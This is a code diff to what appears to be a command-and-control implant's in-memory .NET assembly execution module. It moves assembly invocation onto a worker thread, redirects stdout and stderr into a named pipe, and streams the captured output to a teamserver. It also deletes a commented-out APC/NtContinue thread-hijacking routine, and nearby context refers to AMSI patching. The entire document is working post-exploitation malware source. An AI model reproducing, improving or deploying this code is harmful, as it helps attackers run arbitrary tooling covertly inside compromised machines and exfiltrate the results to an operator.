@@ -5,7 +5,14 @@
 #include <core/HwBpExceptions.h>
 #include <core/Runtime.h>
 
+/* Named-pipe buffer size. Sized generously so short-running assemblies
+ * never have to wait for the drain loop to consume anything. */
 #define PIPE_BUFFER 0x10000 * 5
+
+/* How long the main thread parks between drain passes while Invoke_3 runs
+ * on the worker thread. Small enough to keep output flowing, large enough
+ * that we don't burn CPU. */
+#define DOTNET_DRAIN_INTERVAL_MS 100
 
 GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
 GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
@@ -16,6 +23,30 @@ GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 
 
 BOOL AmsiPatched = FALSE;
 
+/* Worker thread that actually invokes the assembly entry point.
+ * We move Invoke_3 off the beacon thread so the main thread can keep
+ * draining the output pipe while the assembly runs — otherwise a chatty
+ * assembly can fill the pipe buffer and deadlock the whole demon. */
+DWORD WINAPI DotnetInvokeThreadProc( LPVOID lpParam )
+{
+    VARIANT Object = { 0 };
+    HRESULT hr     = S_OK;
+
+    if ( ! Instance->Dotnet || ! Instance->Dotnet->MethodInfo ) {
+        return (DWORD) E_FAIL;
+    }
+
+    hr = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3(
+        Instance->Dotnet->MethodInfo,
+        Object,
+        Instance->Dotnet->MethodArgs,
+        &Instance->Dotnet->Return );
+
+    Instance->Dotnet->InvokeResult = hr;
+
+    return (DWORD) hr;
+}
+
 BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 {
     PPACKAGE       PackageInfo    = NULL;
@@ -24,16 +55,16 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     LPWSTR*        ArgumentsArray = NULL;
     INT            ArgumentsCount = 0;
     LONG           idx[ 1 ]       = { 0 };
-    VARIANT        Object         = { 0 };
     NTSTATUS       Status         = STATUS_SUCCESS;
     DWORD          ThreadId       = 0;
     HRESULT        Result         = S_OK;
     BOOL           AmsiIsLoaded   = FALSE;
+    HANDLE         hInvokeThread  = NULL;
 
     if ( ! Assembly.Buffer || ! Assembly.Length )
         return FALSE;
 
-    /* Create a named pipe for our output. try with anon pipes at some point. */
+    /* Create a named pipe for our output. */
     Instance->Dotnet->Pipe = Instance->Win32.CreateNamedPipeW(
         Instance->Dotnet->PipeName.Buffer,
         PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
@@ -44,19 +75,32 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         NULL
     );
 
-    if ( ! Instance->Dotnet->Pipe )
+    /* CreateNamedPipeW returns INVALID_HANDLE_VALUE (not NULL) on failure. */
+    if ( ! Instance->Dotnet->Pipe || Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE )
     {
         PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
 
+        Instance->Dotnet->Pipe = NULL;
         return FALSE;
     }
 
-    if ( ! ( Instance->Dotnet->File = Instance->Win32.CreateFileW( Instance->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
+    Instance->Dotnet->File = Instance->Win32.CreateFileW(
+        Instance->Dotnet->PipeName.Buffer,
+        GENERIC_WRITE,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL );
+
+    /* CreateFileW also returns INVALID_HANDLE_VALUE on failure. */
+    if ( ! Instance->Dotnet->File || Instance->Dotnet->File == INVALID_HANDLE_VALUE )
     {
         PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
 
+        Instance->Dotnet->File = NULL;
         return FALSE;
     }
 
@@ -182,7 +226,8 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         return FALSE;
     }
 
-    Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
+    /* Last field -> entryPoint == 1 is needed if Main(String[] args); 0 if Main() */
+    Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
 
     ArgumentsArray = Instance->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
     ArgumentsArray++;
@@ -200,110 +245,92 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
     if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->MethodArgs, idx, &Instance->Dotnet->vtPsa ) ) ) {
         PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
-            return FALSE;
+        return FALSE;
     }
 
+    /* Redirect stdout AND stderr to our pipe (client end).
+     * Save the originals so DotnetClose can restore them — otherwise
+     * anything else in the process that later writes to stdio will
+     * hit a handle that no longer exists. */
     Instance->Dotnet->StdOut = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
-    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE , Instance->Dotnet->File );
+    Instance->Dotnet->StdErr = Instance->Win32.GetStdHandle( STD_ERROR_HANDLE );
+    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Dotnet->File );
+    Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, Instance->Dotnet->File );
 
-    if ( ( Result = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance->Dotnet->MethodInfo, Object, Instance->Dotnet->MethodArgs, &Instance->Dotnet->Return ) ) ) {
-        PRINTF( "Invoke Assembly Failed: %x\n", Result )
-        return FALSE;
+    /* Run the entry point on a worker thread so the main thread can keep
+     * draining the pipe. This is what prevents the classic 320 KB deadlock. */
+    PUTS( "Invoke assembly on worker thread..." )
+    Instance->Dotnet->InvokeResult = S_OK;
+
+    Status = Instance->Win32.NtCreateThreadEx(
+        &hInvokeThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        NtCurrentProcess(),
+        (LPTHREAD_START_ROUTINE) DotnetInvokeThreadProc,
+        NULL,
+        FALSE,                /* start immediately */
+        0, 0, 0,
+        NULL );
+
+    if ( ! NT_SUCCESS( Status ) || ! hInvokeThread )
+    {
+        PRINTF( "NtCreateThreadEx (invoke) Failed: %08x\n", Status )
+
+        /* Fall back to synchronous invoke — no drainer means output past
+         * PIPE_BUFFER bytes may hang, but a stuck fallback is still better
+         * than silently emitting nothing. */
+        VARIANT ObjectLocal = { 0 };
+        Instance->Dotnet->InvokeResult = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3(
+            Instance->Dotnet->MethodInfo, ObjectLocal, Instance->Dotnet->MethodArgs, &Instance->Dotnet->Return );
+    }
+    else
+    {
+        Instance->Dotnet->Thread = hInvokeThread;
+
+        /* Poll: wait a short interval for the thread to finish, then drain
+         * whatever the assembly has written since the last pass. Repeat
+         * until the thread exits. */
+        for ( ;; )
+        {
+            DWORD WaitResult = Instance->Win32.WaitForSingleObjectEx(
+                Instance->Dotnet->Thread,
+                DOTNET_DRAIN_INTERVAL_MS,
+                FALSE );
+
+            DotnetPushPipe();
+
+            if ( WaitResult == WAIT_OBJECT_0 )
+                break;
+
+            if ( WaitResult == WAIT_FAILED )
+            {
+                PRINTF( "WaitForSingleObjectEx failed: %d\n", NtGetLastError() )
+                break;
+            }
+        }
+    }
+
+    /* Restore stdio before we start tearing anything down. */
+    if ( Instance->Dotnet->StdOut ) {
+        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Dotnet->StdOut );
+    }
+    if ( Instance->Dotnet->StdErr ) {
+        Instance->Win32.SetStdHandle( STD_ERROR_HANDLE, Instance->Dotnet->StdErr );
     }
 
     Instance->Dotnet->Invoked = TRUE;
 
-    /* push output */
-    DotnetPush();
+    /* One last drain to catch anything the assembly emitted between the
+     * final wait and thread exit. */
+    DotnetPushPipe();
 
-
-    /*
-     * TODO: Finish/Fix this.
-     *       It seems like its way to unstable to use this
-     *       assembly crashes the agent randomly and dont know why.
-     *       Fix this once i get motivated enough or remove this entirely. */
-
-    /*
-    PUTS( "Create Thread..." )
-
-    MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
-    MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );
-
-    ThreadAttr.Entry.Attribute = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
-    ThreadAttr.Entry.Size      = sizeof( CLIENT_ID );
-    ThreadAttr.Entry.pValue    = &ClientId;
-    ThreadAttr.Length          = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
-
-    PUTS( "Creating events..." )
-    if ( NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
-         NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
+    if ( Instance->Dotnet->InvokeResult != S_OK )
     {
-        if ( NT_SUCCESS( Instance->Win32.NtCreateThreadEx( &Instance->Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
-        {
-            Instance->Dotnet->RopInit = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopInvk = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopEvnt = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopExit = MmHeapAlloc( sizeof( CONTEXT ) );
-
-            Instance->Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
-            if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( Instance->Dotnet->Thread, Instance->Dotnet->RopInit ) ) )
-            {
-                MemCopy( Instance->Dotnet->RopInvk, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
-                MemCopy( Instance->Dotnet->RopEvnt, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
-                MemCopy( Instance->Dotnet->RopExit, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
-
-                // This rop executes the entrypoint of the assembly
-                Instance->Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
-                Instance->Dotnet->RopInvk->Rip           = U_PTR( Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3 );
-                Instance->Dotnet->RopInvk->Rcx           = U_PTR( Instance->Dotnet->MethodInfo );
-                Instance->Dotnet->RopInvk->Rdx           = U_PTR( &Object );
-                Instance->Dotnet->RopInvk->R8            = U_PTR( Instance->Dotnet->MethodArgs );
-                Instance->Dotnet->RopInvk->R9            = U_PTR( &Instance->Dotnet->Return );
-                *( PVOID* )( Instance->Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
-
-                // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
-                Instance->Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
-                Instance->Dotnet->RopEvnt->Rip           = U_PTR( Instance->Win32.NtSetEvent );
-                Instance->Dotnet->RopEvnt->Rcx           = U_PTR( Instance->Dotnet->Event );
-                Instance->Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
-                *( PVOID* )( Instance->Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
-
-                // Wait til we freed everything from the dotnet
-                Instance->Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
-                Instance->Dotnet->RopExit->Rip           = U_PTR( Instance->Win32.NtWaitForSingleObject );
-                Instance->Dotnet->RopExit->Rcx           = U_PTR( Instance->Dotnet->Exit );
-                Instance->Dotnet->RopExit->Rdx           = U_PTR( FALSE );
-                Instance->Dotnet->RopExit->R8            = U_PTR( NULL );
-                *( PVOID* )( Instance->Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
-
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
-
-                PUTS( "Resume Thread..." )
-                if ( NT_SUCCESS( Instance->Win32.NtAlertResumeThread( Instance->Dotnet->Thread, NULL ) ) )
-                {
-                    PUTS( "Apc started and assembly invoked." )
-
-                    PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
-                    PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
-                    PackageAddInt32( PackageInfo, ClientId.UniqueThread );
-                    PackageTransmit( PackageInfo );
-
-                    // we have successfully invoked the main function of the assembly executable.
-                    Instance->Dotnet->Invoked = TRUE;
-
-                } else PUTS( "NtAlertResumeThread failed" )
-
-            } else PUTS( "NtGetThreadContext failed" )
-
-        } else PUTS( "NtCreateThreadEx failed" )
-
-    } else PUTS( "NtCreateEvent failed" )
-    */
+        PRINTF( "Invoke Assembly Failed: %x\n", Instance->Dotnet->InvokeResult )
+        /* Report failure but don't discard the (already drained) output. */
+        return FALSE;
+    }
 
     return TRUE;
 }
@@ -317,59 +344,72 @@ VOID DotnetPushPipe()
     if ( ! Instance->Dotnet )
         return;
 
+    if ( ! Instance->Dotnet->Pipe || Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE )
+        return;
+
     /* see how much there is in the named pipe */
     if ( Instance->Win32.PeekNamedPipe( Instance->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
     {
-        PRINTF( "Read: %d\n", Read );
-
         if ( Read > 0 )
         {
+            PRINTF( "Read: %d\n", Read );
+
             Instance->Dotnet->Output.Length = Read;
             Instance->Dotnet->Output.Buffer = MmHeapAlloc( Instance->Dotnet->Output.Length );
 
-            Instance->Win32.ReadFile( Instance->Dotnet->Pipe, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length, &BytesRead, NULL );
-            Instance->Dotnet->Output.Length = BytesRead;
+            if ( ! Instance->Dotnet->Output.Buffer )
+                return;
 
-            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance->Dotnet->RequestID );
-            PackageAddBytes( Package, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length );
-            PackageTransmit( Package );
-
-            if ( Instance->Dotnet->Output.Buffer )
+            if ( Instance->Win32.ReadFile( Instance->Dotnet->Pipe, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length, &BytesRead, NULL ) && BytesRead > 0 )
             {
-                MemSet( Instance->Dotnet->Output.Buffer, 0, Read );
-                MmHeapFree( Instance->Dotnet->Output.Buffer );
-                Instance->Dotnet->Output.Buffer = NULL;
+                Instance->Dotnet->Output.Length = BytesRead;
+
+                PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance->Dotnet->RequestID );
+                PackageAddBytes( Package, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length );
+                PackageTransmit( Package );
             }
+
+            MemSet( Instance->Dotnet->Output.Buffer, 0, Read );
+            MmHeapFree( Instance->Dotnet->Output.Buffer );
+            Instance->Dotnet->Output.Buffer = NULL;
+            Instance->Dotnet->Output.Length = 0;
         }
     }
 }
 
 VOID DotnetPush()
 {
+    PPACKAGE Package = NULL;
+    HRESULT  Result  = S_OK;
+
     if ( ! Instance->Dotnet )
         return;
 
     PRINTF( "Instance->Dotnet->Invoked: %s\n", Instance->Dotnet->Invoked ? "TRUE" : "FALSE" )
+
     if ( Instance->Dotnet->Invoked )
     {
-        /* Read from the assembly named pipe and send it to the server */
+        Result = Instance->Dotnet->InvokeResult;
+
+        /* Final drain of any bytes still sitting in the pipe buffer. */
         DotnetPushPipe();
 
-        /* check if the assembly is still running. */
-        /* if ( Instance->Win32.WaitForSingleObjectEx( Instance->Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
+        /* Tell the operator (and teamserver) that this request is done.
+         * Teamserver keys off DOTNET_INFO_FINISHED / DOTNET_INFO_FAILED to
+         * call a.RequestCompleted(RequestID), which unblocks callbacks
+         * such as BofCallback and the Python DotnetInlineExecute wrappers. */
+        if ( Result == S_OK )
         {
-            PUTS( "Event has been signaled" )
-
-            Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+            Package = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
             PackageAddInt32( Package, DOTNET_INFO_FINISHED );
             PackageTransmit( Package );
-
-            PUTS( "Dotnet Invoke thread isn't active anymore." )
-            Close = TRUE;
-        } */
-
-        /* just in case the assembly pushed something last minute... */
-        DotnetPushPipe();
+        }
+        else
+        {
+            Package = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
+            PackageAddInt32( Package, DOTNET_INFO_FAILED );
+            PackageTransmit( Package );
+        }
 
         /* Now free everything */
         DotnetClose();
@@ -378,6 +418,9 @@ VOID DotnetPush()
 
 VOID DotnetClose()
 {
+    if ( ! Instance->Dotnet )
+        return;
+
 #ifndef DEBUG
     Instance->Win32.FreeConsole();
 #endif
@@ -388,14 +431,19 @@ VOID DotnetClose()
 
     if ( Instance->Dotnet->Event ) {
         SysNtClose( Instance->Dotnet->Event );
+        Instance->Dotnet->Event = NULL;
     }
 
-    if ( Instance->Dotnet->Pipe ) {
-        SysNtClose( Instance->Dotnet->Pipe );
-    }
-
-    if ( Instance->Dotnet->File ) {
+    /* Close the write-end first so any final bytes the pipe has buffered
+     * get flushed to the read-end before we tear that down. */
+    if ( Instance->Dotnet->File && Instance->Dotnet->File != INVALID_HANDLE_VALUE ) {
         SysNtClose( Instance->Dotnet->File );
+        Instance->Dotnet->File = NULL;
+    }
+
+    if ( Instance->Dotnet->Pipe && Instance->Dotnet->Pipe != INVALID_HANDLE_VALUE ) {
+        SysNtClose( Instance->Dotnet->Pipe );
+        Instance->Dotnet->Pipe = NULL;
     }
 
     if ( Instance->Dotnet->RopInit ) {
@@ -483,19 +531,18 @@ VOID DotnetClose()
     }
 
     if ( Instance->Dotnet->Thread ) {
-        SysNtTerminateThread( Instance->Dotnet->Thread, 0 );
         SysNtClose( Instance->Dotnet->Thread );
+        Instance->Dotnet->Thread = NULL;
     }
 
     if ( Instance->Dotnet->Exit ) {
         SysNtClose( Instance->Dotnet->Exit );
+        Instance->Dotnet->Exit = NULL;
     }
 
-    if ( Instance->Dotnet ) {
-        MemSet( Instance->Dotnet, 0, sizeof( DOTNET_ARGS ) );
-        MmHeapFree( Instance->Dotnet );
-        Instance->Dotnet = NULL;
-    }
+    MemSet( Instance->Dotnet, 0, sizeof( DOTNET_ARGS ) );
+    MmHeapFree( Instance->Dotnet );
+    Instance->Dotnet = NULL;
 }
 
 BOOL FindVersion( PVOID Assembly, DWORD length )
